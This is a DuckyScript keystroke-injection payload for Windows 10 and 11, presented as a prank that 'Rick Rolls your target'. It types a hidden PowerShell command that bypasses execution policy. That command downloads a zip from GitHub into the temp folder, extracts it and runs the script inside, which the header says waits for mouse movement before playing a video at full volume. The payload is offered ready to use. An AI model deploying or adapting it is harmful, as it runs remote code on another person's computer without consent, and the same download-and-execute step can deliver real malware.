REM     Title: ADV-RickRoll

REM     Author: I am Jakoby

REM     Description: This is a one liner payload that will Rick Roll your target. Video will be played a full screen and max volume. 
REM     Upon deployment payload will pause until a mouse movement is detected and run once one is. 

REM     Target: Windows 10, 11

REM     --------------------------------------------------------------------------------------
REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
REM     --------------------------------------------------------------------------------------

DELAY 2000
GUI r
DELAY 500
STRING powershell -w h -NoP -NonI -Exec Bypass $U='https://github.com/I-Am-Jakoby/I-Am-Jakoby/raw/main/Assets/rr.zip';$Z="$env:TMP"+'\rr.zip';$D="$env:TMP"+'\rr';iwr -Uri $U -O $Z;Expand-Archive $Z -DestinationPath $D\ -Force;powershell $D\rr.ps1
ENTER